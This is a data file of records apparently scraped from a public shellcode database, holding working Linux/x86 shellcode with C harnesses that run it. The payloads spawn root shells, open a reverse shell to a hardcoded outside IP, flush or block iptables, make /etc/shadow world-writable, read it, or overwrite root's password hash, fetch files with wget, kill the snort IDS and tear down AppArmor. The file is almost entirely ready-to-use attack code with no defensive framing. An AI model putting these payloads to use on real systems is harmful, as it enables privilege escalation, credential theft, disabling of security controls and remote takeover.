{"Title": "Linux/x86 - setresuid(0,0,0) + execve(/bin/sh) + exit() Shellcode (41 bytes)", "Author": "sacrine", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-551.php", "View": null, "code": ["/* linux x86 shellcode(41 bytes) by sacrine of Netric (www.netric.org)", " * setresuid(0,0,0); execve /bin/sh; exit;", " *", "", "        __asm(\" xorl %eax,%eax", "                xorl %ebx,%ebx", "                xorl %ecx,%ecx", "                cdq", "                movb $0xa4, %al", "                int $0x80", "", "                xorl %eax,%eax", "                push %eax", "                pushl   $0x68732f2f", "                pushl   $0x6e69622f", "                mov %esp, %ebx", "                push %eax", "                push %ebx", "                lea (%esp,1),%ecx", "                movb $0xb, %al", "                int $0x80", "", "                xorl %eax,%eax", "                mov  $0x1, %al", "                int $0x80", "\"); ", "", "*/", "", "char main[]=", "        // setresuid(0,0,0);", "", "        \"\\x31\\xc0\"              // xor  %eax,%eax", "        \"\\x31\\xdb\"              // xor  %ebx,%ebx", "        \"\\x31\\xc9\"              // xor  %ecx,%ecx", "        \"\\x99\"                  // cdq", "        \"\\xb0\\xa4\"              // mov  $0xa4, %al", "        \"\\xcd\\x80\"              // int  $0x80", "", "        // execve /bin/sh", "", "        \"\\x31\\xc0\"                      // xor    %eax,%eax", "        \"\\x50\"                          // push   %eax", "        \"\\x68\\x2f\\x2f\\x73\\x68\"          // push   $0x68732f2f", "        \"\\x68\\x2f\\x62\\x69\\x6e\"          // push   $0x6e69622f", "        \"\\x89\\xe3\"                      // mov    %esp,%ebx", "        \"\\x50\"                          // push   %eax", "        \"\\x53\"                          // push   %ebx", "        \"\\x8d\\x0c\\x24\"                  // lea    (%esp,1),%ecx", "        \"\\xb0\\x0b\"                      // mov    $0xb,%al", "        \"\\xcd\\x80\"                      // int    $0x80", "", "        // exit", "", "        \"\\x31\\xc0\"              // xorl %eax,%eax", "        \"\\xb0\\x01\"              // movb $0x1, %al", "        \"\\xcd\\x80\";             // int  $0x80"]},
{"Title": "Linux/x86 - Reverse (www.netric.org:45295/TCP) Shell (/bin/sh) Shellcode (131 bytes)", "Author": "eSDee", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-552.php", "View": null, "code": ["/* linux x86 shellcode by eSDee of Netric (www.netric.org)", " * 131 byte - connect back shellcode (port=0xb0ef)", " */     ", "", "#include <stdio.h>", "", "char", "shellcode[] = ", "        \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x51\\xb1\"", "        \"\\x06\\x51\\xb1\\x01\\x51\\xb1\\x02\\x51\"", "        \"\\x89\\xe1\\xb3\\x01\\xb0\\x66\\xcd\\x80\"", "        \"\\x89\\xc2\\x31\\xc0\\x31\\xc9\\x51\\x51\"", "        \"\\x68\\x41\\x42\\x43\\x44\\x66\\x68\\xb0\"", "        \"\\xef\\xb1\\x02\\x66\\x51\\x89\\xe7\\xb3\"", "        \"\\x10\\x53\\x57\\x52\\x89\\xe1\\xb3\\x03\"", "        \"\\xb0\\x66\\xcd\\x80\\x31\\xc9\\x39\\xc1\"", "        \"\\x74\\x06\\x31\\xc0\\xb0\\x01\\xcd\\x80\"", "        \"\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\xcd\\x80\"", "        \"\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\xb1\\x01\"", "        \"\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\"", "        \"\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x31\\xd2\"", "        \"\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\"", "        \"\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\"", "        \"\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\"", "        \"\\x01\\xcd\\x80\";", "", "int", "c_code()", "{", "        char *argv[2];", "        char *sockaddr = \"\\x02\\x00\"             //  Address family", "                         \"\\xef\\xb0\"             //  port", "                         \"\\x00\\x00\\x00\\x00\"     //  sin_addr", "                         \"\\x00\\x00\\x00\\x00\"", "                         \"\\x00\\x00\\x00\\x00\";", "", "        int sock;", "", "        sock = socket(2, 1, 6);", "        if (connect(sock, sockaddr, 16) < 0) exit();", "", "        dup2(sock, 0);", "        dup2(sock, 1);", "        dup2(sock, 2);", "", "        argv[0] = \"//bin/sh\";", "        argv[1] = NULL;", "", "        execve(argv[0], &argv[0], NULL);", "        exit();", "}", "", "int", "asm_code()", "{", "        __asm(\" # sock = socket(2, 1, 6);", "                xorl    %eax,   %eax", "                xorl    %ebx,   %ebx", "                xorl    %ecx,   %ecx", "                pushl   %ecx", "                movb    $6,     %cl             # IPPROTO_TCP", "                pushl   %ecx", "                movb    $1,     %cl             # SOCK_STREAM", "                pushl   %ecx", "                movb    $2,     %cl             # AF_INET", "                pushl   %ecx", "                movl    %esp,   %ecx", "                movb    $1,     %bl             # SYS_SOCKET", "                movb    $102,   %al             # SYS_socketcall", "                int     $0x80", "", "                # connect(sock, sockaddr, 16)", "                movl    %eax,   %edx", "                xorl    %eax,   %eax", "                xorl    %ecx,   %ecx", "                pushl   %ecx", "                pushl   %ecx", "                pushl   $0x44434241             # ip address", "                pushw   $0xefb0                 # port", "                movb    $0x02,  %cl             # address family", "                pushw   %cx", "                movl    %esp,   %edi", "                movb    $16,    %bl             # sizeof(sockaddr)", "                pushl   %ebx", "                pushl   %edi", "                pushl   %edx                    # sock", "                movl    %esp,   %ecx", "                movb    $3,     %bl             # SYS_CONNECT", "                movb    $102,   %al             # SYS_socketcall", "                int     $0x80           ", "                xorl    %ecx,   %ecx", "                cmpl    %eax,   %ecx", "                je CONNECTED", "", "                # exit()", "                xorl    %eax,   %eax", "                movb    $1,     %al             # SYS_exit", "                int     $0x80", "", "                CONNECTED:", "                # dup2(sock, 0);", "                xorl    %eax,   %eax", "                movb    $63,    %al             # SYS_dup2", "                movl    %edx,   %ebx            # sock", "                int     $0x80", "", "                # dup2(sock, 1);", "                xorl    %eax,   %eax", "                movb    $63,    %al             # SYS_dup2", "                movl    %edx,   %ebx            # sock", "                movb    $1,     %cl             # stdout", "                int     $0x80", "", "                # dup2(sock, 2);", "                xorl    %eax,   %eax", "                movb    $63,    %al             # SYS_dup2", "                movl    %edx,   %ebx            # sock", "                movb    $2,     %cl             # stderr", "                int     $0x80", "", "                # execve(argv[0], &argv[0], NULL);", "                xorl    %eax,   %eax", "                xorl    %edx,   %edx", "                pushl   %eax", "                pushl   $0x68732f6e             # the string", "                pushl   $0x69622f2f             # //bin/sh", "                movl    %esp,   %ebx", "                pushl   %eax", "                pushl   %ebx", "                movl    %esp,   %ecx", "                movb    $11,    %al             # SYS_execve", "                int     $0x80", "", "                # exit()", "                xorl    %eax,   %eax", "                movb    $1,     %al             # SYS_exit", "                int     $0x80", "                \");", "}", "", "int", "main()", "{", "        void (*funct)();", "", "        shellcode[33] = 81;     /* ip of www.netric.org :) */", "        shellcode[34] = 17;", "        shellcode[35] = 46;", "        shellcode[36] = 156;", "", "        (long) funct = &shellcode; ", "        funct();        ", "        return 0;", "}"]},
{"Title": "Linux/x86 - /sbin/iptables --flush Shellcode (69 bytes)", "Author": "eSDee", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-554.php", "View": null, "code": ["/* linux x86 shellcode by eSDee of Netric (www.netric.org)", " * /sbin/iptables --flush", " */", "", "char", "main[] =", "        \"\\x31\\xc0\\x31\\xdb\\xb0\\x02\\xcd\\x80\"", "        \"\\x39\\xd8\\x75\\x2d\\x31\\xc0\\x50\\x66\"", "        \"\\x68\\x2d\\x46\\x89\\xe6\\x50\\x68\\x62\"", "        \"\\x6c\\x65\\x73\\x68\\x69\\x70\\x74\\x61\"", "        \"\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\"", "        \"\\x2f\\x73\\x89\\xe3\\x8d\\x54\\x24\\x10\"", "        \"\\x50\\x56\\x54\\x89\\xe1\\xb0\\x0b\\xcd\"", "        \"\\x80\\x89\\xc3\\x31\\xc0\\x31\\xc9\\x31\"", "        \"\\xd2\\xb0\\x07\\xcd\\x80\"; ", "", "        /* your evil shellcode here */", "", "int ", "asm_code()", "{", "        __asm(\"", "                xorl %eax,%eax", "                xorl %ebx,%ebx", "                movb $2, %al", "                int $0x080", "                cmpl %ebx,%eax", "                jne WAIT", "", "                xorl  %eax,%eax", "                pushl %eax", "                pushw $0x462d", "                movl %esp,%esi", "                pushl %eax", "                pushl $0x73656c62", "                pushl $0x61747069", "                pushl $0x2f6e6962", "                pushl $0x732f2f2f", "                movl   %esp,%ebx", "                leal   0x10(%esp),%edx", "                pushl  %eax", "                pushl  %esi", "                pushl  %esp", "                movl   %esp,%ecx", "                movb   $0xb,%al", "                int    $0x80", "", "                WAIT:", "                movl %eax, %ebx", "                xorl %eax, %eax", "                xorl %ecx, %ecx", "                xorl %edx, %edx", "                movb $7, %al", "                int $0x80", "                \");", "", "}"]},
{"Title": "Linux/x86 - setuid(0) + execve(/bin/sh) Shellcode (29 bytes)", "Author": "Marcin Ulikowski", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-598.php", "View": null, "code": ["/* 29 byte-long setuid(0) + execve(\"/bin/sh\",...) shellcode", "   by Marcin Ulikowski <elceef@itsec.pl> */", " ", "#include <unistd.h>", " ", "char shellcode[] =", "\"\\x31\\xdb\"             /* xor    %ebx,%ebx       */", "\"\\x8d\\x43\\x17\"         /* lea    0x17(%ebx),%eax */", "\"\\xcd\\x80\"             /* int    $0x80           */", "\"\\x53\"                 /* push   %ebx            */", "\"\\x68\\x6e\\x2f\\x73\\x68\" /* push   $0x68732f6e     */", "\"\\x68\\x2f\\x2f\\x62\\x69\" /* push   $0x69622f2f     */", "\"\\x89\\xe3\"             /* mov    %esp,%ebx       */", "\"\\x50\"                 /* push   %eax            */", "\"\\x53\"                 /* push   %ebx            */", "\"\\x89\\xe1\"             /* mov    %esp,%ecx       */", "\"\\x99\"                 /* cltd                   */", "\"\\xb0\\x0b\"             /* mov    $0xb,%al        */", "\"\\xcd\\x80\";            /* int    $0x80           */", " ", "int main(void) {", "  void(*f)()=(void*)shellcode;f();", "  return 0;", "}"]},
{"Title": "Linux/x86 - setuid(0) + execve(/bin/sh, 0, 0) Shellcode (27 bytes)", "Author": "Marcin Ulikowski", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-599.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/*", "\tby Magnefikko", "\t24.04.2010", "\tmagnefikko@gmail.com", "\tPromhyl Studies :: http://promhyl.oz.pl", "\tSubgroup: #PRekambr", "\tName: 27 bytes setuid(0) ^ execve(\"/bin/sh\", 0, 0) shellcode", "\tPlatform: Linux x86", "\t", "\tsetuid(0);", "\texecve(\"/bin/sh\", 0, 0);\t", "", "\tgcc -Wl,-z,execstack filename.c", "", "\tshellcode:", "", "\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x99\\x31\\xc9\\xb0\\x0b\\xcd\\x80", "", "*/", "", "", "int main(){", "\tchar shell[] =\"\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x99\\x31\\xc9\\xb0\\x0b\\xcd\\x80\";", "\tprintf(\"by Magnefikko\\nmagnefikko@gmail.com\\npromhyl.oz.pl\\n\\nstrlen(shell)= %d\\n\", strlen(shell));", "\t(*(void (*)()) shell)();", "}"]},
{"Title": "Linux/x86 - setuid(0) + chmod(/etc/shadow, 0666) Shellcode (37 bytes)", "Author": "antrhacks", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-608.php", "View": null, "code": ["/* ", " * Title: linux/x86 setuid(0) + chmod(\"/etc/shadow\", 0666) Shellcode 37 Bytes", " * Type: Shellcode", " * Author: antrhacks", " * Platform: Linux X86", "*/", "", "/* ASSembly", " 31 db                \txor    %ebx,%ebx", " b0 17                \tmov    $0x17,%al", " cd 80                \tint    $0x80", " 31 c0                \txor    %eax,%eax", " 50                   \tpush   %eax", " 68 61 64 6f 77       \tpush   $0x776f6461", " 68 63 2f 73 68       \tpush   $0x68732f63", " 68 2f 2f 65 74       \tpush   $0x74652f2f", " 89 e3                \tmov    %esp,%ebx", " 66 b9 b6 01          \tmov    $0x1b6,%cx", " b0 0f                \tmov    $0xf,%al", " cd 80                \tint    $0x80", " 40                   \tinc    %eax", " cd 80                \tint    $0x80", "*/", "", "int main(){", " char shell[] = \"\\x31\\xdb\\xb0\\x17\\xcd\\x80\\x31\\xc0\\x50\"", "\"\\x68\\x61\\x64\\x6f\\x77\\x68\\x63\\x2f\\x73\\x68\"", "\"\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\x66\\xb9\\xb6\\x01\"", "\"\\xb0\\x0f\\xcd\\x80\\x40\\xcd\\x80\";", "", " printf(\"[*] Taille du ShellCode = %d\\n\", strlen(shell));", " (*(void (*)()) shell)();", " ", " return 0;", "}"]},
{"Title": "Linux/x86 - pwrite(/etc/shadow, (md5 hash of agix), 32, 8) Shellcode (89 bytes)", "Author": "agix", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-610.php", "View": null, "code": ["/* ", " | Title: Linux/x86 pwrite(\"/etc/shadow\", hash, 32, 8) Shellcode 89 Bytes", " | Description: replace root's password with hash of \"agix\" in MD5", " | Type: Shellcode", " | Author: agix", " | Platform: Linux X86", "*/", "", "#include <stdio.h>", "", "char shellcode[] =", "\"\\x31\\xC9\"            \t\t//xor ecx,ecx", "\"\\x51\"              \t\t//push ecx", "\"\\x68\\x61\\x64\\x6F\\x77\"   \t//push dword 0x776f6461", "\"\\x68\\x63\\x2F\\x73\\x68\"      \t//push dword 0x68732f63", "\"\\x68\\x2F\\x2F\\x65\\x74\" \t\t//push dword 0x74652f2f", "\"\\x89\\xE3\"               \t//mov ebx,esp", "\"\\x66\\xB9\\x91\\x01\"         \t//mov cx,0x191", "\"\\x31\\xC0\"               \t//xor eax,eax", "\"\\xB0\\x05\"               \t//mov al,0x5", "\"\\xCD\\x80\"               \t//int 0x80", "\"\\x89\\xC3\"               \t//mov ebx,eax", "\"\\xEB\\x12\" \t\t\t//jmp short 0x34", "\"\\x59\" \t\t\t\t//pop ecx", "\"\\x31\\xC0\"               \t//xor eax,eax", "\"\\x31\\xD2\"               \t//xor edx,edx", "\"\\xB2\\x20\"               \t//mov dl,0x20", "\"\\xB0\\xB5\"               \t//mov al,0xb5", "\"\\x31\\xF6\"               \t//xor esi,esi", "\"\\x6A\\x08\"            \t\t//push byte +0x8", "\"\\x5E\"                 \t\t//pop esi", "\"\\x31\\xFF\"               \t//xor edi,edi", "\"\\xCD\\x80\"               \t//int 0x80", "\"\\xE8\\xE9\\xFF\\xFF\\xFF\"      \t//call 0x22", "//db \"IMMkmgi9$NuhPs1B8H5uz7kEOeKf2H1:\"", "\"\\x49\\x4D\\x4D\\x6B\\x6D\\x67\\x69\\x39\"", "\"\\x24\\x4E\\x75\\x68\\x50\\x73\\x31\\x42\"", "\"\\x38\\x48\\x35\\x75\\x7A\\x37\\x6B\\x45\"", "\"\\x4F\\x65\\x4B\\x66\\x32\\x48\\x31\\x3A\";", "", "int main(int argc, char **argv) {", "        int *ret;", "        ret = (int *)&ret + 2;", "        (*ret) = (int) shellcode;", "}"]},
{"Title": "Linux/x86 - Remote File Download Shellcode (42 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-611.php", "View": null, "code": ["/*", "Title: \t Linux x86 - Remote file Download - 42 bytes", "Author:\t Jonathan Salwan <submit AT shell-storm.org>", "Web:\t http://www.shell-storm.org", "Twitter: http://twitter.com/jonathansalwan", "", "", "!Database of Shellcodes http://www.shell-storm.org/shellcode/", "", "", "08048054 <.text>:", " 8048054:\t6a 0b                \tpush   $0xb", " 8048056:\t58                   \tpop    %eax", " 8048057:\t99                   \tcltd   ", " 8048058:\t52                   \tpush   %edx", " 8048059:\t68 61 61 61 61       \tpush   $0x61616161", " 804805e:\t89 e1                \tmov    %esp,%ecx", " 8048060:\t52                   \tpush   %edx", " 8048061:\t6a 74                \tpush   $0x74", " 8048063:\t68 2f 77 67 65       \tpush   $0x6567772f", " 8048068:\t68 2f 62 69 6e       \tpush   $0x6e69622f", " 804806d:\t68 2f 75 73 72       \tpush   $0x7273752f", " 8048072:\t89 e3                \tmov    %esp,%ebx", " 8048074:\t52                   \tpush   %edx", " 8048075:\t51                   \tpush   %ecx", " 8048076:\t53                   \tpush   %ebx", " 8048077:\t89 e1                \tmov    %esp,%ecx", " 8048079:\tcd 80                \tint    $0x80", " 804807b:\t40                   \tinc    %eax", " 804807c:\tcd 80                \tint    $0x80", "*/", "", "#include <stdio.h>", "", "char sc[] = \t\"\\x6a\\x0b\\x58\\x99\\x52\"", "\t\t\"\\x68\\x61\\x61\\x61\\x61\" // Change it", "\t\t\"\\x89\\xe1\\x52\\x6a\\x74\"", "\t\t\"\\x68\\x2f\\x77\\x67\\x65\"", "\t\t\"\\x68\\x2f\\x62\\x69\\x6e\"", "\t\t\"\\x68\\x2f\\x75\\x73\\x72\"", "\t\t\"\\x89\\xe3\\x52\\x51\\x53\"", "\t\t\"\\x89\\xe1\\xcd\\x80\\x40\"", "\t\t\"\\xcd\\x80\";", "", "int main(void)", "{", "       \tfprintf(stdout,\"Length: %d\\n\",strlen(sc));", "\t(*(void(*)()) sc)();", "     ", "return 0;", "}"]},
{"Title": "Linux/x86 - chmod(/etc/shadow, 0666) + ASCII Shellcode (443 bytes)", "Author": "agix", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-650.php", "View": null, "code": ["  /*", " | Title: Linux/x86 chmod(/etc/shadow, 0666) ASCII   Shellcode 443 Bytes", "", " | Type: Shellcode", " | Author: agix", " | Platform: Linux X86", "*/", "", "#include <stdio.h>", "", "char shellcode[] =", "\"LLLLhHEY!X5HEY!\"", "\"HZTYRRRPTURWa-5lmm-2QQQ-8AAAfhRRfZ0p>0x?fh88fZ0p?fh  \"", "\"fZ0pS0pH0p?fh55fZ0p@fhbbfZ0pA0pBfhyyfZ0pAfhwwfZ0pE0pB\"", "\"fhDDfZ0pCfhddfZ0pU0pDfhzzfZ0pW0pDfhuufZ0pEfhhhfZ0pJ0p\"", "\"FfhoofZ0pF0pMfhccfZ0pV0pGfhiifZ0pGfh//fZ0pL0pM0pHfhss\"", "\"fZ0pIfhmmfZ0pIfhaafZ0pJfhHHfZ0pKfhnnfZ0pLfheefZ0pR0pN\"", "\"0pOfhttfZ0pO0pN0xPfhVVfZ0pP0xQfh((fZ0pQfhPPfZ0pQfhfff\"", "\"Z0pRfhFFfZ0pS0xSfhIIfZ0pTfhssfZ0pT0xTfhOOfZ0pV0xVfh22\"", "\"fZ0pXfh  fZ0pX0xXfh@@fZ0pY0xY\"", "", "\"c'est quoi ma note de secu ?\";", "", "", "int main(int argc, char **argv) {", "        int *ret;", "        ret = (int *)&ret + 2;", "        (*ret) = (int) shellcode;", "}"]},
{"Title": "Linux/x86 - /sbin/iptables -POUTPUT DROP Shellcode (60 bytes)", "Author": "John Babio", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-740.php", "View": null, "code": ["Name = John Babio", "Twitter = 3vi1john", "Arch = Linux/x86-32 bits", "", "Code ///sbin/iptables -POUTPUT DROP(Policy of drop to OUTPUT chain)", "", "const char sc[] = ", "\"\\x31\\xc0\\x31\\xd2\\x50\\x68\\x44\\x52\\x4f\\x50\\x89\\xe7\\x50\\x68\\x54\\x50\\x55\\x54\\x68\\x2d\"", "\"\\x50\\x4f\\x55\\x89\\xe1\\x50\\x68\\x62\\x6c\\x65\\x73\\x68\\x69\\x70\\x74\\x61\\x68\\x62\\x69\\x6e\"", "\"\\x2f\\x68\\x2f\\x2f\\x2f\\x73\\x89\\xe3\\x50\\x57\\x51\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";       ", "main(){", "      int (*shell)();", "      shell=sc;", "      shell();", "    }", "", "08048060 <_start>:", " 8048060:    31 c0                    xor    %eax,%eax", " 8048062:    31 d2                    xor    %edx,%edx", " 8048064:    50                       push   %eax", " 8048065:    68 44 52 4f 50           push   $0x504f5244", " 804806a:    89 e7                    mov    %esp,%edi", " 804806c:    50                       push   %eax", " 804806d:    68 54 50 55 54           push   $0x54555054", " 8048072:    68 2d 50 4f 55           push   $0x554f502d", " 8048077:    89 e1                    mov    %esp,%ecx", " 8048079:    50                       push   %eax", " 804807a:    68 62 6c 65 73           push   $0x73656c62", " 804807f:    68 69 70 74 61           push   $0x61747069", " 8048084:    68 62 69 6e 2f           push   $0x2f6e6962", " 8048089:    68 2f 2f 2f 73           push   $0x732f2f2f", " 804808e:    89 e3                    mov    %esp,%ebx", " 8048090:    50                       push   %eax", " 8048091:    57                       push   %edi", " 8048092:    51                       push   %ecx", " 8048093:    53                       push   %ebx", " 8048094:    89 e1                    mov    %esp,%ecx", " 8048096:    31 d2                    xor    %edx,%edx", " 8048098:    b0 0b                    mov    $0xb,%al", " 804809a:    cd 80                    int    $0x80"]},
{"Title": "Linux/x86 - /usr/bin/killall snort Shellcode (46 bytes)", "Author": "John Babio", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-741.php", "View": null, "code": ["Name = John Babio", "Twitter = 3vi1john", "", "/usr/bin/killall snort", "", "const char sc[] = \"\\x31\\xc0\\x50\\x6a\\x74\\x68\\x73\\x6e\\x6f\\x72\\x89\\xe6\\x50\\x68\\x6c\\x61\\x6c\\x6c\\x68\\x2f\\x6b\"", "\"\\x69\\x6c\\x68\\x2f\\x62\\x69\\x6e\\x68\\x2f\\x75\\x73\\x72\\x89\\xe3\\x50\\x56\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";", "main(){", "      int (*shell)();", "      shell=sc;", "      shell();", "    }", "", "8048060 <_start>:", " 8048060:       31 c0                   xor    %eax,%eax", " 8048062:       50                      push   %eax", " 8048063:       6a 74                   push   $0x74", " 8048065:       68 73 6e 6f 72          push   $0x726f6e73", " 804806a:       89 e6                   mov    %esp,%esi", " 804806c:       50                      push   %eax", " 804806d:       68 6c 61 6c 6c          push   $0x6c6c616c", " 8048072:       68 2f 6b 69 6c          push   $0x6c696b2f", " 8048077:       68 2f 62 69 6e          push   $0x6e69622f", " 804807c:       68 2f 75 73 72          push   $0x7273752f", " 8048081:       89 e3                   mov    %esp,%ebx", " 8048083:       50                      push   %eax", " 8048084:       56                      push   %esi", " 8048085:       53                      push   %ebx", " 8048086:       89 e1                   mov    %esp,%ecx", " 8048088:       31 d2                   xor    %edx,%edx", " 804808a:       b0 0b                   mov    $0xb,%al", " 804808c:       cd 80                   int    $0x80"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (21 bytes) (3)", "Author": "Kernel_Panik", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-752.php", "View": null, "code": ["/*", " Title: linux/x86 Shellcode execve (\"/bin/sh\") - 21 Bytes", " Date     : 10 Feb 2011", " Author   : kernel_panik", " Thanks   : cOokie, agix, antrhacks", "*/", "", "/*", " xor ecx, ecx", " mul ecx", " push ecx", " push 0x68732f2f   ;; hs//", " push 0x6e69622f   ;; nib/", " mov ebx, esp", " mov al, 11", " int 0x80", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "char code[] = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\"", "              \"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"", "              \"\\xe3\\xb0\\x0b\\xcd\\x80\";", "", "int main(int argc, char **argv)", "{", " printf (\"Shellcode length : %d bytes\\n\", strlen (code));", " int(*f)()=(int(*)())code;", " f();", "}"]},
{"Title": "Linux/x86 - execve(/bin/dash) Shellcode (49 bytes)", "Author": "Chroniccommand", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-756.php", "View": null, "code": ["/*", "*  Shellcode length: 49 ", "*  Author: Chroniccommand ", "*  /bin/dash", "*  My first attempt at shellcode", "*  Poison security", "*/", "#include<stdio.h>", "//49 bytes ", "char shellcode[] =  \"\\xeb\\x18\\x5e\\x31\\xc0\\x88\\x46\\x09\\x89\\x76\\x0a\"", "                    \"\\x89\\x46\\x0e\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x0a\\x8d\"", "                    \"\\x56\\x0e\\xcd\\x80\\xe8\\xe3\\xff\\xff\\xff\\x2f\"", "                    \"\\x62\\x69\\x6e\\x2f\\x64\\x61\\x73\\x68\\x41\\x42\\x42\"", "                    \"\\x42\\x42\\x43\\x43\\x43\\x43\";", "int main(){", " printf(\"Shellcode length: 49 bytes\\nAuthor:chroniccommand\\nPoison security\");", " int *ret;", " ret = (int *)&ret + 2;", " (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - execve(/bin/cat, /etc/shadow, NULL) Shellcode (42 bytes)", "Author": "antrhacks", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-758.php", "View": null, "code": ["/* ", " * Title: linux/x86 execve(/bin/cat, /etc/shadow, NULL) - 42 bytes", " * Type: Shellcode", " * Author: antrhacks", " * Platform: Linux X86", "*/", "", "/* ASSembly", " 31 c0                \txor    %eax,%eax", " 50                   \tpush   %eax", " 68 2f 63 61 74       \tpush   $0x7461632f", " 68 2f 62 69 6e       \tpush   $0x6e69622f", " 89 e3                \tmov    %esp,%ebx", " 50                   \tpush   %eax", " 68 61 64 6f 77       \tpush   $0x776f6461", " 68 2f 2f 73 68       \tpush   $0x68732f2f", " 68 2f 65 74 63       \tpush   $0x6374652f", " 89 e1                \tmov    %esp,%ecx", " 50                   \tpush   %eax", " 51                   \tpush   %ecx", " 53                   \tpush   %ebx", " 89 e1                \tmov    %esp,%ecx", " b0 0b                \tmov    $0xb,%al", " cd 80", "*/", "", "int main(){", "char shell[] =", "\"\\x31\\xc0\"", "\"\\x50\"", "\"\\x68\\x2f\\x63\\x61\\x74\"", "\"\\x68\\x2f\\x62\\x69\\x6e\"", "\"\\x89\\xe3\"", "\"\\x50\"", "\"\\x68\\x61\\x64\\x6f\\x77\"", "\"\\x68\\x2f\\x2f\\x73\\x68\"", "\"\\x68\\x2f\\x65\\x74\\x63\"", "\"\\x89\\xe1\"", "\"\\x50\"", "\"\\x51\"", "\"\\x53\"", "\"\\x89\\xe1\"", "\"\\xb0\\x0b\"", "\"\\xcd\\x80\";", "", " printf(\"[*] Taille du ShellCode = %d\\n\", strlen(shell));", " (*(void (*)()) shell)();", " ", " return 0;", "}"]},
{"Title": "Linux/x86 - /etc/init.d/apparmor teardown Shellcode (53 bytes)", "Author": "John Babio", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-765.php", "View": null, "code": ["Name = John Babio", "Twitter = 3vi1john", "", "/etc/init.d/apparmor teardown", "", "const char sc[] = \"\\x6a\\x0b\\x58\\x31\\xd2\\x52\\x68\\x64\\x6f\\x77\\x6e\\x68\\x74\\x65\\x61\\x72\\x89\\xe1\"", "\"\\x52\\x68\\x72\\x6d\\x6f\\x72\\x68\\x61\\x70\\x70\\x61\\x68\\x74\\x2e\\x64\\x2f\\x68\\x2f\\x69\\x6e\\x69\\x68\\x2f\"", "\"\\x65\\x74\\x63\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\";", "", "main(){", "      int (*shell)();", "      shell=sc;", "      shell();", "    }", "", "08048060 <_start>:", " 8048060:    6a 0b                    push   $0xb", " 8048062:    58                       pop    %eax", " 8048063:    31 d2                    xor    %edx,%edx", " 8048065:    52                       push   %edx", " 8048066:    68 64 6f 77 6e           push   $0x6e776f64", " 804806b:    68 74 65 61 72           push   $0x72616574", " 8048070:    89 e1                    mov    %esp,%ecx", " 8048072:    52                       push   %edx", " 8048073:    68 72 6d 6f 72           push   $0x726f6d72", " 8048078:    68 61 70 70 61           push   $0x61707061", " 804807d:    68 74 2e 64 2f           push   $0x2f642e74", " 8048082:    68 2f 69 6e 69           push   $0x696e692f", " 8048087:    68 2f 65 74 63           push   $0x6374652f", " 804808c:    89 e3                    mov    %esp,%ebx", " 804808e:    52                       push   %edx", " 804808f:    51                       push   %ecx", " 8048090:    53                       push   %ebx", " 8048091:    89 e1                    mov    %esp,%ecx", " 8048093:    cd 80                    int    $0x80"]},
